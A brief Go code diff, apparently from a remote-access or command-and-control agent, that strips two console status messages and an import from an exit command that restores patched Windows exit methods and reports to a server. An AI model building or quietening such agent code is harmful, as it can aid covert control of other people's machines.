@@ -5,7 +5,6 @@
 package main
 
 import (
-	"fmt"
 	"os"
 	"runtime"
 	"time"
@@ -38,12 +37,12 @@ func (c *ExitCommand) Execute(ctx *CommandContext, args []string) CommandResult 
 
 	// Check if we need to restore exit patches on Windows
 	if runtime.GOOS == "windows" && exitMethodsPatched && exitPrevention != nil {
-		fmt.Println("[*] Restoring original exit methods before termination...")
+		// removed debug log
 		// Call RestoreAll directly - it will be a no-op on non-Windows
 		if err := exitPrevention.RestoreAll(); err != nil {
 		}
 		exitMethodsPatched = false
-		fmt.Println("[+] Exit methods restored, proceeding with graceful exit")
+		// removed debug log
 	}
 
 	// Let the server know we're exiting
